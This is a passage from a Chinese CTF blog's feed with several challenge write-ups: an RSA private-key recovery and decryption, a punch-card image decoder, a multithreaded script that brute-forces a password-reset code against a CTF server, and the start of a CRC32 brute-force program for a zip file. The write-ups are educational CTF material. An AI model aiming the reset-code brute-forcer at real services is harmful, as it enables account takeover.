<span class="number">0xf3959d978e02eb9f06def3f335d8f8afd7609951ddac60b714b6c22af0fa912f210b34206bd24a9601c78df4a0275f107fd3ab552d95057eb934e71bddcd7045c24b18587b8c8fcf5add4c5d83f0c77c94dc9c50cbe438e2b67bafd31633b6aaf1781d90c3ad6f03d037b3321801b23546d483e67e26067f7b22347ddbc0c2d592ce814cbf5dfccc141437f14e0b3990f88061e5f0bae5f01e3fa70db0e9605e7cfd575e9c81efeec529c33fd9037a20fd8acd513ac9637768313e63f9838ae3511cdd0a9a2b516f2148c8d475a360a06359449739eecd251abb42b014573e439f2fa4573557b25699ffc11e631ce8ee975a86e7e272bcf5f76a93450348fe3f</span></span><br><span class="line">     n = <span class="number">0x367198D6B5614E95813ADD8F22A4717BC72BE1EABD933D1B86944FDB75B8ED230BE62D7D1B69D222095C128C86F82012ECB116191FD9D018A6D02F84DB27BC51A21307DC86F4BF771C691C143E5ABE549B5BD2D6EB1A21FD6270E7E1B48FE0611FBB2E1B0B3524E6F4DE8B4E4A345DA44A13DE825B72608DB6C7C4A40B78266E6C87BBFDEF6B48381D49C4507A58BCD47B76D64B45908B158BD7EBC4DACB0B1CFD6C2C19574F40EB2EFD0E9E10DC7005CAD39BCAF52B9EAC3873368D69031C5E724684A44F068EFD1D3DC096D9B5D6411E58BDEE43E46B99A0D0494B9DB28195AF901AFF130D4A6E203DAD08DA57FA7E40262A5BADB2A323EDA28B44696AB305D</span></span><br><span class="line">     d = hack_RSA(e,n)</span><br><span class="line">     <span class="keyword">print</span> d</span><br></pre></td></tr></table></figure></p>
<p>得到<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">d</span>＝4221909016509078129201801236879446760697885220928506696150646938237440992746683409881141451831939190609743447676525325543963362353923989076199470515758399</span><br></pre></td></tr></table></figure></p>
<p>这样就可以解密了<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">n</span> = 0x367198D6B5614E95813ADD8F22A4717BC72BE1EABD933D1B86944FDB75B8ED230BE62D7D1B69D222095C128C86F82012ECB116191FD9D018A6D02F84DB27BC51A21307DC86F4BF771C691C143E5ABE549B5BD2D6EB1A21FD6270E7E1B48FE0611FBB2E1B0B3524E6F4DE8B4E4A345DA44A13DE825B72608DB6C7C4A40B78266E6C87BBFDEF6B48381D49C4507A58BCD47B76D64B45908B158BD7EBC4DACB0B1CFD6C2C19574F40EB2EFD0E9E10DC7005CAD39BCAF52B9EAC3873368D69031C5E724684A44F068EFD1D3DC096D9B5D6411E58BDEE43E46B99A0D0494B9DB28195AF901AFF130D4A6E203DAD08DA57FA7E40262A5BADB2A323EDA28B44696AB305D</span><br><span class="line"><span class="keyword">d</span> = 4221909016509078129201801236879446760697885220928506696150646938237440992746683409881141451831939190609743447676525325543963362353923989076199470515758399</span><br><span class="line">c = 0x1e04304936215de8e21965cfca9c245b1a8f38339875d36779c0f123c475bc24d5eef50e7d9ff5830e80c62e8083ec55f27456c80b0ab26546b9aeb8af30e82b650690a2ed7ea407dcd094ab9c9d3d25a93b2140dcebae1814610302896e67f3ae37d108cd029fae6362ea7ac1168974c1a747ec9173799e1107e7a56d783660418ebdf6898d7037cea25867093216c2c702ef3eef71f694a6063f5f0f1179c8a2afe9898ae8dec5bb393cdffa3a52a297cd96d1ea602309ecf47cd009829b44ed3100cf6194510c53c25ca7435f60ce5f4f614cdd2c63756093b848a70aade002d6bc8f316c9e5503f32d39a56193d1d92b697b48f5aa43417631846824b5e86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">m</span> = hex(pow(c,<span class="keyword">d</span>,<span class="keyword">n</span>)).rstrip(<span class="string">"L"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="literal">m</span></span><br><span class="line"><span class="keyword">print</span> binascii.unhexlify(<span class="keyword">m</span>[2:])</span><br></pre></td></tr></table></figure></p>
<p>getflag!</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这道题是rsa的题，给了公钥,和c。<br>]]>
    
    </summary>
    
      <category term="bctf" scheme="http://edward-l.github.io/tags/bctf/"/>
    
      <category term="hduisa_ctf" scheme="http://edward-l.github.io/tags/hduisa-ctf/"/>
    
      <category term="rsa" scheme="http://edward-l.github.io/tags/rsa/"/>
    
      <category term="sql_injection" scheme="http://edward-l.github.io/tags/sql-injection/"/>
    
      <category term="writeup" scheme="http://edward-l.github.io/categories/writeup/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[punchcard]]></title>
    <link href="http://edward-l.github.io/2015/03/25/punchcard/"/>
    <id>http://edward-l.github.io/2015/03/25/punchcard/</id>
    <published>2015-03-25T07:30:16.000Z</published>
    <updated>2015-03-25T06:40:44.000Z</updated>
    <content type="html"><![CDATA[<p>之前bkp的一道题，有了脚本，就再也不怕看花眼了～<br><img src="http://edwardl.qiniudn.com/123.png" alt=""><br><a id="more"></a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">START_PIXEL_X = <span class="number">17</span></span><br><span class="line">START_PIXEL_Y = <span class="number">24</span></span><br><span class="line"></span><br><span class="line">X_NEXT_PIXEL = <span class="number">7</span></span><br><span class="line">Y_NEXT_PIXEL = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">TOTAL_ROWS = <span class="number">12</span></span><br><span class="line">TOTAL_COLUMNS = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ascii</span><span class="params">(index1,index2,index3)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> index1 == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">if</span> index2 ==<span class="number">4</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'a'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 ==<span class="number">5</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'b'</span></span><br><span class="line">                <span class="keyword">elif</span> index2 ==<span class="number">6</span>:</span><br><span class="line">			<span class="keyword">if</span> index3 == <span class="number">11</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'.'</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'c'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">7</span>:</span><br><span class="line">			<span class="keyword">if</span> index3 == <span class="number">11</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'&lt;'</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'d'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">8</span>:</span><br><span class="line">			<span class="keyword">if</span> index3 ==<span class="number">11</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'('</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'e'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 ==<span class="number">9</span>:</span><br><span class="line">			<span class="keyword">if</span> index3 == <span class="number">11</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'+'</span></span><br><span class="line">			<span class="keyword">else</span> :</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'f'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 ==<span class="number">10</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'g'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">11</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'h'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">12</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'i'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'&amp;'</span></span><br><span class="line">	<span class="keyword">elif</span> index1 == <span class="number">2</span>:</span><br><span class="line">		<span class="keyword">if</span> index2 == <span class="number">4</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'j'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">5</span>:</span><br><span class="line">			<span class="keyword">if</span> index3 == <span class="number">11</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'!'</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'k'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">6</span>:</span><br><span class="line">			<span class="keyword">if</span> index3 == <span class="number">11</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'$'</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'l'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">7</span>:</span><br><span class="line">			<span class="keyword">if</span> index3 == <span class="number">11</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'*'</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'m'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">8</span>:</span><br><span class="line">			<span class="keyword">if</span> index3 ==<span class="number">11</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">')'</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'n'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">9</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'o'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">10</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'p'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">11</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'q'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">12</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'r'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'-'</span></span><br><span class="line">	<span class="keyword">elif</span> index1 ==<span class="number">3</span>:</span><br><span class="line">		<span class="keyword">if</span> index2 == <span class="number">5</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'s'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">4</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'/'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">6</span>:</span><br><span class="line">			<span class="keyword">if</span> index3 ==<span class="number">11</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">','</span></span><br><span class="line">			<span class="keyword">else</span> :</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'t'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 ==<span class="number">7</span>:</span><br><span class="line">			<span class="keyword">if</span> index3 ==<span class="number">11</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'%'</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'u'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 ==<span class="number">8</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'v'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 ==<span class="number">9</span>:</span><br><span class="line">			<span class="keyword">if</span> index3 ==<span class="number">11</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'&gt;'</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'w'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">10</span>:</span><br><span class="line">			<span class="keyword">if</span> index3 ==<span class="number">11</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'?'</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">'x'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">11</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'y'</span></span><br><span class="line">		<span class="keyword">elif</span> index2 == <span class="number">12</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'z'</span></span><br><span class="line">	<span class="keyword">elif</span> index1 ==<span class="number">4</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'1'</span></span><br><span class="line">	<span class="keyword">elif</span> index1 ==<span class="number">5</span>:</span><br><span class="line">		<span class="keyword">if</span> index2 ==<span class="number">11</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">':'</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'2'</span></span><br><span class="line">	<span class="keyword">elif</span> index1 ==<span class="number">6</span>:</span><br><span class="line">		<span class="keyword">if</span> index2 ==<span class="number">11</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'#'</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'3'</span></span><br><span class="line">	<span class="keyword">elif</span> index1 ==<span class="number">10</span>:</span><br><span class="line">		<span class="keyword">if</span> index2 == <span class="number">11</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'"'</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'7'</span></span><br><span class="line">	<span class="keyword">elif</span> index1 ==<span class="number">8</span>:</span><br><span class="line">		<span class="keyword">if</span> index2 ==<span class="number">11</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'5'</span></span><br><span class="line">	<span class="keyword">elif</span> index1 == <span class="number">9</span>:</span><br><span class="line">		<span class="keyword">if</span> index2 == <span class="number">11</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'='</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'6'</span></span><br><span class="line">	<span class="keyword">elif</span> index1 ==<span class="number">7</span>:</span><br><span class="line">		<span class="keyword">if</span> index2 == <span class="number">11</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'@'</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'4'</span></span><br><span class="line">	<span class="keyword">elif</span> index1 == <span class="number">11</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'8'</span></span><br><span class="line">	<span class="keyword">elif</span> index1 == <span class="number">12</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'9'</span></span><br><span class="line"><span class="comment">#	elif index1 ==0:</span></span><br><span class="line"><span class="comment">#		return ''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im = Image.open(<span class="string">'123.png'</span>)</span><br><span class="line">pix = im.load()</span><br><span class="line">rgb_im = im.convert(<span class="string">'RGB'</span>)</span><br><span class="line">r,g,b = rgb_im.getpixel((START_PIXEL_X,START_PIXEL_Y))</span><br><span class="line"><span class="comment">#stringbuilder = '!'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,TOTAL_COLUMNS+<span class="number">1</span>):</span><br><span class="line">	bulletedindex = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">	count = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>,TOTAL_ROWS+<span class="number">1</span>):</span><br><span class="line">		r,g,b = rgb_im.getpixel((X_NEXT_PIXEL*x+<span class="number">10</span>,Y_NEXT_PIXEL	*y+<span class="number">4</span>))</span><br><span class="line">		<span class="keyword">if</span> r == <span class="number">20</span> <span class="keyword">and</span> g ==<span class="number">20</span> <span class="keyword">and</span> b ==<span class="number">20</span>:</span><br><span class="line">			bulletedindex[count] = y</span><br><span class="line">			count = count +<span class="number">1</span></span><br><span class="line"><span class="comment">#		stringbuilder = stringbuilder + get_ascii(bulletedindex[0],bulletedindex[1],bulletedindex[2])	</span></span><br><span class="line">	<span class="keyword">print</span> get_ascii(bulletedindex[<span class="number">0</span>],bulletedindex[<span class="number">1</span>],bulletedindex[<span class="number">2</span>])	</span><br><span class="line"><span class="comment">#print stringbuilder</span></span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<p>之前bkp的一道题，有了脚本，就再也不怕看花眼了～<br><img src="http://edwardl.qiniudn.com/123.png" alt=""><br>]]>
    
    </summary>
    
      <category term="PIL" scheme="http://edward-l.github.io/tags/PIL/"/>
    
      <category term="bkpctf" scheme="http://edward-l.github.io/tags/bkpctf/"/>
    
      <category term="punchcard" scheme="http://edward-l.github.io/tags/punchcard/"/>
    
      <category term="python" scheme="http://edward-l.github.io/tags/python/"/>
    
      <category term="python" scheme="http://edward-l.github.io/categories/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[hduisa_ctf_week5_writeup]]></title>
    <link href="http://edward-l.github.io/2015/03/16/hduisa_ctf_week5_writeup/"/>
    <id>http://edward-l.github.io/2015/03/16/hduisa_ctf_week5_writeup/</id>
    <published>2015-03-16T02:30:16.000Z</published>
    <updated>2015-03-24T15:51:46.000Z</updated>
    <content type="html"><![CDATA[<h3 id="Problem_ID:17">Problem ID:17</h3><h3 id="EasyUser">EasyUser</h3><p>一看就是一个爆破验证码的题目，然后就开始写脚本<br><a id="more"></a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib    </span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(x,y)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> flag</span><br><span class="line">	<span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(x,y):</span><br><span class="line">		url = <span class="string">'http://104.236.171.163/week5/easyuser/forget.php'</span>    </span><br><span class="line">		values = &#123;<span class="string">'number'</span> : i&#125;    </span><br><span class="line">		data = urllib.urlencode(values)  </span><br><span class="line">		req = urllib2.Request(url, data)  </span><br><span class="line">		response = urllib2.urlopen(req)</span><br><span class="line">		html = response.read()</span><br><span class="line">	<span class="comment">#	print html</span></span><br><span class="line">		match = re.match(<span class="string">r'.*10.*'</span>, html, re.S)</span><br><span class="line">		<span class="keyword">if</span>  match:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'%d is not psd'</span> %i</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'%d is the psd'</span> %i</span><br><span class="line">			flag  = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="comment">#	print html</span></span><br><span class="line">	<span class="comment">#	print match</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"current has %d threads"</span> % (threading.activeCount() - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line">t1 = threading.Thread(target = run, args = (<span class="number">500000</span>,<span class="number">600000</span>))</span><br><span class="line">t2 = threading.Thread(target = run, args = (<span class="number">600000</span>,<span class="number">700000</span>))</span><br><span class="line">t3 = threading.Thread(target = run, args = (<span class="number">700000</span>,<span class="number">800000</span>))</span><br><span class="line">t4 = threading.Thread(target = run, args = (<span class="number">800000</span>,<span class="number">900000</span>))</span><br><span class="line">t5 = threading.Thread(target = run, args = (<span class="number">900000</span>,<span class="number">1000000</span>))</span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line">t3.start()</span><br><span class="line">t4.start()</span><br><span class="line">t5.start()</span><br><span class="line"><span class="comment"># for i in range(5):</span></span><br><span class="line"><span class="comment"># 	t3 = threading.Thread(target = run, args=(500000,600000))</span></span><br><span class="line"><span class="comment"># 	t3.start()</span></span><br></pre></td></tr></table></figure>
<h3 id="Problem_ID:18">Problem ID:18</h3><h3 id="听说你们想玩其他类型的题目？">听说你们想玩其他类型的题目？</h3><p>一道之前bkpctf的一道题的弱化版，叫做punch。明天有空可以把那个题写一下贴出来，就这道题而言直接查表就好了。可以看下这个虚拟的<a href="http://www.masswerk.at/keypunch/" target="_blank" rel="external">打印机</a>。<br><img src="http://edwardl.qiniudn.com/123.png" alt=""></p>
<h3 id="Problem_ID:19">Problem ID:19</h3><h3 id="上面那个太简单了">上面那个太简单了</h3><p>这次给了一个压缩包，可以看见很短的长度和crc，所以可能是通过爆破来解题，查了一下资料，写了个脚本开始爆破。<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">include</span> &lt;windows.<span class="keyword">h</span>&gt;</span><br><span class="line">#<span class="keyword">include</span> &lt;stdio.<span class="keyword">h</span>&gt;</span><br><span class="line"><span class="comment">//crc32.h</span></span><br><span class="line">#ifndef _CRC32_H</span><br><span class="line">#define _CRC32_H</span><br><span class="line"> </span><br><span class="line">UINT crc32( UCHAR *buf, int len);</span><br><span class="line"> </span><br><span class="line">#endif</span><br><span class="line"> </span><br><span class="line">static UINT   CRC32[256];</span><br><span class="line">static <span class="keyword">char</span>   init = 0;</span><br><span class="line"> </span><br><span class="line">static void init_table()</span><br><span class="line">&#123;</span><br><span class="line">    int   i,j;</span><br><span class="line">    UINT   <span class="keyword">crc</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = 0;i &lt; 256;i++)</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="keyword">crc</span> = i;</span><br><span class="line">    <span class="keyword">for</span>(j = 0;j &lt; 8;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">crc</span> &amp; 1)</span><br><span class="line">        &#123;</span><br><span class="line">             <span class="keyword">crc</span> = (<span class="keyword">crc</span> &gt;&gt; 1) ^ 0xEDB88320;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">             <span class="keyword">crc</span> = <span class="keyword">crc</span> &gt;&gt; 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     CRC32[i] = <span class="keyword">crc</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span 